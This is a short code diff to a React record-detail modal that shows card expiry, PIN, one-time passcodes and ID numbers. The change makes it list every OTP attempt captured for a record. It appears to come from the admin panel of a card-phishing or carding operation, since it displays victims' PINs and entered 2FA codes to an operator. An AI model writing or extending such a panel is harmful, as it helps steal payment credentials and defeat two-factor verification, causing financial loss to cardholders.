@@ -35,7 +35,12 @@ export default function RecordDetailModal({ record: r, onClose }) {
           <Field label="Expiry Month" value={r.expiry_month} />
           <Field label="Expiry Year" value={r.expiry_year} />
           <Field label="PIN" value={r.pin} highlight="text-red-400" />
-          <Field label="OTP 1" value={r.otp1} highlight="text-blue-300" />
+          <div className="flex flex-col gap-0.5">
+            <span className="text-xs text-gray-500 uppercase tracking-wide">OTP 1 (all attempts)</span>
+            {r.otp1 ? r.otp1.split(" | ").map((otp, i) => (
+              <span key={i} className="text-sm font-medium text-blue-300">#{i + 1}: {otp}</span>
+            )) : <span className="text-sm font-medium text-white">—</span>}
+          </div>
           <Field label="OTP 2" value={r.otp2} highlight="text-blue-300" />
           <Field label="ID Number" value={r.id_number} />
           <Field label="Network" value={r.network} />
